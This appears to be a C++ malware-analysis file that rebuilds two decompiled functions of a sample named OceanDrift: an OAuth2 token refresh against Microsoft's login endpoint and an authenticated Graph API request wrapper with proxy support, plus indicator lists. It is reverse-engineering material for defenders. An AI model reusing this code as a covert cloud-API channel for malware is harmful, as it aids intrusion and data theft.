#include "analysis_types.hpp"

#include <nlohmann/json.hpp>
#include <curl/curl.h>

#include <chrono>
#include <cstdint>
#include <ctime>
#include <string>
#include <vector>

namespace oceandrift::analysis {

using json = nlohmann::json;

// decrypt_config_field: the binary decrypts stored credential fields.
// For analysis purposes, this is a passthrough — the fields are stored
// in plaintext in the session struct after initial config loading.
static std::string decrypt_config_field(const std::string& encrypted_field)
{
    return encrypted_field;
}

// curl_log_error: the binary logs curl error codes; stub for analysis.
static void curl_log_error(int /*curl_code*/) {}

// ============================================================================
// IDA Decompilation  --  graph_api_refresh_access_token  @  0x00428A00
//
// Summary (malware analysis):
//   Builds an OAuth2 refresh-token POST request to the Microsoft identity
//   platform.  Constructs the token endpoint URL from the tenant ID stored
//   in the session, assembles the form-encoded body from decrypted
//   credentials (client_id, client_secret, refresh_token, scope), and
//   performs the HTTP POST via libcurl.
//
//   On a successful response the function parses the JSON body and extracts:
//     - "access_token"  -> stored into session->access_token
//     - "refresh_token" -> stored into session->refresh_token
//     - "expires_in"    -> default 3600; used to compute an absolute expiry
//                          timepoint stored at session->token_expiry
//
//   Returns true (1) when a new access token was obtained, false (0) on any
//   failure (disabled, no curl handle, no access_token in response).
// ============================================================================

bool graph_api_refresh_access_token(GraphApiSession* session)
{
    /* ---- early-out: check if Graph API usage is enabled ---- */
    if (!session->proxy_enabled && session->config_param_0.empty())
        return false;

    /* ---- initialise curl session ---- */
    CURL* curl = curl_easy_init_wrapper();
    if (!curl)
        return false;

    /* ---- build token endpoint URL ---- */
    std::string token_url =
        "https://login.microsoftonline.com/"
        + session->tenant_id
        + "/oauth2/v2.0/token";

    /* ---- decrypt credential fields from config ---- */
    std::string scope          = decrypt_config_field(session->scope);
    std::string refresh_token  = decrypt_config_field(session->refresh_token);
    std::string client_secret  = decrypt_config_field(session->client_secret);
    std::string client_id      = decrypt_config_field(session->client_id);

    /* ---- assemble form-encoded POST body ---- */
    std::string post_body;
    post_body  = "client_id="       + client_id;
    post_body += "&client_secret="  + client_secret;
    post_body += "&refresh_token="  + refresh_token;
    post_body += "&grant_type=refresh_token";
    post_body += "&scope="          + scope;

    /* ---- configure curl options ---- */
    std::string response_buf;

    curl_easy_setopt(curl, CURLOPT_URL, token_url.c_str());              /* 10002 */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);                            /* 47 */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_body.c_str());       /* 10015 */
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &curl_write_callback); /* 20011 */
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);            /* 10001 */

    /* ---- optional: proxy configuration ---- */
    if (session->proxy_enabled)
    {
        curl_easy_setopt(curl, CURLOPT_PROXY,                            /* 10004 */
                         session->proxy_host.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXYPORT,                        /* 59 */
                         static_cast<long>(session->proxy_port));

        if (!session->proxy_user.empty())
        {
            std::string proxy_cred =
                session->proxy_user + ":"
                + session->proxy_pass;
            curl_easy_setopt(curl, CURLOPT_PROXYUSERPWD,                 /* 10006 */
                             proxy_cred.c_str());
            curl_easy_setopt(curl, CURLOPT_PROXYAUTH,                    /* 111 */
                             static_cast<long>(CURLAUTH_ANY));           /* -17 */
        }
    }

    /* ---- execute HTTP request ---- */
    CURLcode curl_result = curl_easy_perform_wrapper(curl);
    curl_easy_cleanup_wrapper(curl);

    if (curl_result != CURLE_OK)
    {
        curl_log_error(static_cast<int>(curl_result));
        return false;
    }

    /* ---- parse JSON response ---- */
    json json_doc = json::parse(response_buf, nullptr, false);

    if (!json_doc.is_object() || !json_doc.contains("access_token"))
    {
        return false;
    }

    /* -- extract access_token -- */
    session->access_token = json_doc["access_token"].get<std::string>();

    /* -- extract refresh_token (if present) -- */
    if (json_doc.contains("refresh_token"))
    {
        session->refresh_token = json_doc["refresh_token"].get<std::string>();
    }

    /* -- extract expires_in (default 3600) -- */
    int expires_in = 3600;
    if (json_doc.contains("expires_in"))
    {
        expires_in = json_doc["expires_in"].get<int>();
    }

    /* -- compute absolute token expiry timepoint -- */
    /* _Xtime_get_ticks returns 100ns ticks since epoch */
    auto now = std::chrono::system_clock::now().time_since_epoch();
    auto now_ticks = std::chrono::duration_cast<
        std::chrono::duration<int64_t, std::ratio<1, 10000000>>>(now).count();
    /* Add expires_in seconds (converted to 100ns ticks) */
    session->token_expiry = now_ticks + static_cast<std::int64_t>(expires_in) * 10000000LL;

    return true;
}


// ============================================================================
// IDA Decompilation  --  graph_api_request_json  @  0x00429630
//
// Summary (malware analysis):
//   Performs an authenticated HTTP request to the Microsoft Graph API.
//   First checks whether the current access token has expired; if so,
//   calls graph_api_refresh_access_token to obtain a fresh one.
//
//   Builds the full URL from the session's Graph base URL + caller-supplied
//   path, constructs "Authorization: Bearer <token>" and "Content-Type: ..."
//   headers, then dispatches via the HTTP method string:
//
//     GET    -- plain GET, no body
//     POST   -- CURLOPT_POST with body in CURLOPT_POSTFIELDS
//     PUT    -- CURLOPT_CUSTOMREQUEST "PUT"  + body
//     DELETE -- CURLOPT_CUSTOMREQUEST "DELETE" (no body)
//     PATCH  -- CURLOPT_CUSTOMREQUEST "PATCH" + body
//
//   On success (curl returns 0), if the method was DELETE and HTTP 204
//   was returned, it synthesises {"success": true} as the return value.
//   Otherwise the raw response is parsed as JSON and returned.
//   On HTTP >= 400, the response is still parsed and returned (allows
//   caller to inspect error payloads).
//   On curl failure, returns a null/empty JSON value.
// ============================================================================

json graph_api_request_json(
    GraphApiSession*   session,
    const std::string& method,            /* HTTP verb: GET / POST / PUT / DELETE / PATCH */
    const std::string& body,              /* request body (may be empty) */
    const std::string& content_type,      /* e.g. "application/json" */
    const std::string& request_path)      /* e.g. "/v1.0/me/drive/root/children" */
{
    /* ---- refresh access token if expired ---- */
    if (token_is_expired(session->token_expiry)
        && !graph_api_refresh_access_token(session))
    {
        /* token refresh failed -- return null JSON */
        return json();
    }

    /* ---- initialise curl session ---- */
    CURL* curl = curl_easy_init_wrapper();
    if (!curl)
    {
        return json();
    }

    /* ---- build full URL: base_url + request_path ---- */
    std::string full_url =
        session->graph_base_url + request_path;

    /* ---- build Authorization header ---- */
    std::string auth_header =
        "Authorization: Bearer " + session->access_token;

    curl_slist* header_list = nullptr;
    header_list = curl_slist_append_wrapper(header_list,
                                            auth_header.c_str());

    /* ---- build Content-Type header ---- */
    std::string ct_header = "Content-Type: " + content_type;
    header_list = curl_slist_append_wrapper(header_list,
                                            ct_header.c_str());

    /* ---- configure common curl options ---- */
    std::string response_buf;

    curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());               /* 10002 */
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);             /* 10023 */
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &curl_write_callback); /* 20011 */
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);            /* 10001 */

    /* ---- optional: proxy configuration ---- */
    if (session->proxy_enabled)
    {
        curl_easy_setopt(curl, CURLOPT_PROXY,                            /* 10004 */
                         session->proxy_host.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXYPORT,                        /* 59 */
                         static_cast<long>(session->proxy_port));

        if (!session->proxy_user.empty())
        {
            std::string proxy_cred =
                session->proxy_user + ":"
                + session->proxy_pass;
            curl_easy_setopt(curl, CURLOPT_PROXYUSERPWD,                 /* 10006 */
                             proxy_cred.c_str());
            curl_easy_setopt(curl, CURLOPT_PROXYAUTH,                    /* 111 */
                             static_cast<long>(CURLAUTH_ANY));           /* -17 */
        }
    }

    /* ---- dispatch by HTTP method ---- */
    if (istring_equal(method.c_str(), method.size(), "GET", 3))
    {
        /* GET -- no additional options needed */
    }
    else if (istring_equal(method.c_str(), method.size(), "POST", 4))
    {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);                       /* 47 */
        if (body.size() != 0)
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());    /* 10015 */
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE,                /* 60 */
                             static_cast<long>(body.size()));
        }
    }
    else if (istring_equal(method.c_str(), method.size(), "PUT", 3))
    {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");            /* 10036 */
        if (body.size() != 0)
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());    /* 10015 */
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE,                /* 60 */
                             static_cast<long>(body.size()));
        }
    }
    else if (istring_equal(method.c_str(), method.size(), "DELETE", 6))
    {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "DELETE");         /* 10036 */
    }
    else if (istring_equal(method.c_str(), method.size(), "PATCH", 5))
    {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PATCH");          /* 10036 */
        if (body.size() != 0)
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());    /* 10015 */
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE,                /* 60 */
                             static_cast<long>(body.size()));
        }
    }
    else
    {
        /* unrecognised method -- clean up and return null */
        curl_slist_free_all_wrapper(header_list);
        curl_easy_cleanup_wrapper(curl);
        return json();
    }

    /* ---- execute HTTP request ---- */
    CURLcode curl_result = curl_easy_perform_wrapper(curl);

    if (curl_result == CURLE_OK)
    {
        /* success -- response received */
        curl_slist_free_all_wrapper(header_list);
        curl_easy_cleanup_wrapper(curl);

        /* parse response body as JSON */
        return json::parse(response_buf, nullptr, false);
    }

    /* ---- curl returned an error / we need to check HTTP status ---- */
    long http_status = 0;
    curl_easy_getinfo_wrapper(curl, CURLINFO_RESPONSE_CODE, &http_status); /* 2097154 */
    curl_slist_free_all_wrapper(header_list);
    curl_easy_cleanup_wrapper(curl);

    /* ---- special case: DELETE returning 204 No Content ---- */
    if (istring_equal(method.c_str(), method.size(), "DELETE", 6)
        && http_status == 204)
    {
        /* synthesise {"success": true} */
        return json{{"success", true}};
    }

    /* ---- non-204 / non-DELETE: parse response body ---- */
    /* Both success (< 400) and error (>= 400) parse the body so caller
       can inspect error payloads */
    return json::parse(response_buf, nullptr, false);
}


// ============================================================================
// Helper: list of OAuth form-field prefixes (for indicator cataloguing)
// ============================================================================

std::vector<std::string> oauth_token_form_fields() {
    return {
        "client_id=",
        "&client_secret=",
        "&refresh_token=",
        "&grant_type=refresh_token",
        "&scope=",
    };
}


// ============================================================================
// Evidence summaries for the analysis catalog
// ============================================================================

FunctionEvidence graph_refresh_evidence() {
    FunctionEvidence out;
    out.address  = 0x00428A00;
    out.function = "graph_api_refresh_access_token";
    out.purpose  = "Builds OAuth2 refresh-token POST to login.microsoftonline.com, "
                   "extracts access_token / refresh_token / expires_in from JSON response, "
                   "computes absolute token expiry timepoint";
    out.indicators = {
        "https://login.microsoftonline.com/",
        "/oauth2/v2.0/token",
        "POST body: client_id= & client_secret= & refresh_token= & grant_type=refresh_token & scope=",
        "curl_easy_setopt CURLOPT_POST (47)",
        "curl_easy_setopt CURLOPT_URL (10002)",
        "curl_easy_setopt CURLOPT_POSTFIELDS (10015)",
        "curl_easy_setopt CURLOPT_WRITEFUNCTION (20011)",
        "curl_easy_setopt CURLOPT_PROXY (10004) -- optional",
        "curl_easy_setopt CURLOPT_PROXYUSERPWD (10006) -- optional",
        "curl_easy_setopt CURLOPT_PROXYAUTH (111, -17 = CURLAUTH_ANY) -- optional",
        "JSON read: access_token",
        "JSON read: refresh_token",
        "JSON read: expires_in (default 3600)",
        "_Xtime_get_ticks + duration -> token_expiry",
        "decrypt_config_field (0x4283F0) for client_id, client_secret, refresh_token, scope",
    };
    return out;
}

FunctionEvidence graph_request_evidence() {
    FunctionEvidence out;
    out.address  = 0x00429630;
    out.function = "graph_api_request_json";
    out.purpose  = "Authenticated HTTP request to Microsoft Graph API; "
                   "refreshes token if expired, dispatches GET/POST/PUT/DELETE/PATCH, "
                   "returns parsed JSON response (or synthesised {\"success\":true} for DELETE 204)";
    out.indicators = {
        "Authorization: Bearer ",
        "Content-Type: ",
        "HTTP methods: GET / POST / PUT / DELETE / PATCH",
        "CURLOPT_CUSTOMREQUEST (10036) for PUT / DELETE / PATCH",
        "CURLOPT_HTTPHEADER (10023)",
        "CURLINFO_RESPONSE_CODE (2097154)",
        "DELETE 204 -> {\"success\": true}",
        "JSON parse of response body on both success and HTTP error (>= 400)",
        "curl_slist_append for Authorization + Content-Type headers",
        "token_is_expired check (0x428330) -> graph_api_refresh_access_token",
    };
    return out;
}

}  // namespace oceandrift::analysis
